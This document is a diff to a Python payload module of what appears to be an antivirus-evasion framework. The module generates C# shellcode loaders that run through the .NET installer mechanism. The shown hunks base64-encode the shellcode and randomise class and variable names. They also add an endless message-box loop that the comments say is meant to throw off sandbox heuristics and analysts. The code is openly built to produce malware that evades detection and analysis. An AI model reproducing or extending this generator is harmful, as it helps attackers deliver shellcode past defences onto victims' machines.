@@ -71,7 +71,6 @@ class PayloadModule:
         Shellcode = base64.b64encode(bytes(Shellcode, 'latin-1')).decode('ascii')
 
         # randomize all our variable names, yo'
-        namespaceName = bypass_helpers.randomString()
         className = bypass_helpers.randomString()
         classNameTwo = bypass_helpers.randomString()
         classNameThree = bypass_helpers.randomString()
@@ -90,12 +89,9 @@ class PayloadModule:
         pinfoName = bypass_helpers.randomString()
         num_tabs_required = 0
 
-        # get 12 random variables for the API imports
+        # get random variables for the API imports
         r = [bypass_helpers.randomString() for x in range(16)]
         y = [bypass_helpers.randomString() for x in range(17)]
-
-        # The header for MSBuild XML files
-        # TODO: Fix the awful formatting
 
         #required syntax at the beginning of any/all payloads
         payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.Configuration.Install; using System.Windows.Forms;\n"
@@ -104,7 +100,7 @@ class PayloadModule:
         # lets add a message box to throw offf sandbox heuristics and analysts :)
         # there is no decryption routine, troll.level = 9000
         # TODO: add a fake decryption function that does nothing and accepts messWithAnalystName as a parameter.
-        payload_code += "\t\t\twhile(true)\n{{ MessageBox.Show(\"Encryption key: {0}\"); Console.ReadLine();}}\n".format(messWithAnalystName)
+        payload_code += "\t\t\twhile(true)\n{{ MessageBox.Show(\"doge\"); Console.ReadLine();}}\n"
         payload_code += "\t\t}\n\t}\n\n"
         payload_code += "\t[System.ComponentModel.RunInstaller(true)]\n"
         payload_code += "\tpublic class {0} : System.Configuration.Install.Installer\n\t{{\n".format(classNameTwo)
